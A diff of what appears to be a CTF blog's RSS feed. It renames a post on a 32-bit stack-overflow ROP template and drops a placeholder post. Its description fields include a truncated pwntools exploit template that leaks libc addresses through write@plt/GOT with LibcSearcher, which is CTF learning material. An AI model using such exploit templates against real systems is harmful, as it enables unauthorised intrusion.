@@ -9,11 +9,11 @@
     <lastBuildDate>Sun, 11 Jul 2021 17:26:35 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>32位栈溢出rop模板</title>
-      <link>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF/</link>
+      <link>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
       <pubDate>Sun, 11 Jul 2021 17:26:35 +0800</pubDate>
       
-      <guid>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF/</guid>
-      <description>32位栈溢出rop模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; process_name = &amp;#39;./&amp;#39; #p = process([process_name], env={&amp;#39;LD_LIBRARY_PATH&amp;#39;:&amp;#39;./&amp;#39;}) p = remote(&amp;#39;&amp;#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &amp;#39;A&amp;#39;*(偏移) + payload p.sendlineafter(&amp;#39;&amp;#39;, payload) main_addr = write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#34;write&amp;#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&amp;#34;write_addr =&amp;gt; %#x&amp;#34;, write_addr) libc = LibcSearcher(&amp;#39;write&amp;#39;, write_addr) libc_base = write_addr - libc.</description>
+      <guid>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
+      <description>32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; process_name = &amp;#39;./&amp;#39; #p = process([process_name], env={&amp;#39;LD_LIBRARY_PATH&amp;#39;:&amp;#39;./&amp;#39;}) p = remote(&amp;#39;&amp;#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &amp;#39;A&amp;#39;*(偏移) + payload p.sendlineafter(&amp;#39;&amp;#39;, payload) main_addr = write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#34;write&amp;#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&amp;#34;write_addr =&amp;gt; %#x&amp;#34;, write_addr) libc = LibcSearcher(&amp;#39;write&amp;#39;, write_addr) libc_base = write_addr - libc.</description>
     </item>
     
     <item>
@@ -79,15 +79,6 @@ v4下面正好是v5，那就可以直接覆盖了
 2.查看文件，保护，运行一下
 64位，开启了NX保护
 就一句话……</description>
-    </item>
-    
-    <item>
-      <title>My First Post</title>
-      <link>https://shaodongshi.github.io/posts/my-first-post/</link>
-      <pubDate>Wed, 07 Jul 2021 15:12:32 +0800</pubDate>
-      
-      <guid>https://shaodongshi.github.io/posts/my-first-post/</guid>
-      <description></description>
     </item>
     
   </channel>
